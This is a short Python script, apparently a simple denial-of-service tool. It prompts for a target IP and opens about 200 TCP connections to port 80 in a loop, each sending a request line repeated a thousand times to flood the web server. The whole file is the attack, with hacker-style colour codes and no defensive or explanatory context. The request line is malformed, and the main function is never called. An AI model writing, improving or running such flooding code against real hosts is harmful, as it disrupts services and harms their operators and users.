Re, Gr, Wh, Ye= '\033[1;31m', '\033[1;32m', '\033[1;37m', '\033[1;33m'
import socket

def main():
    target = input(f"\n{Wh} Enter target ip:{Gr} ")
    for i in range(1,200):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,80))
        data = b"GET / HTTP 1.1\r\n"*1000
        s.send(data)
        s.close()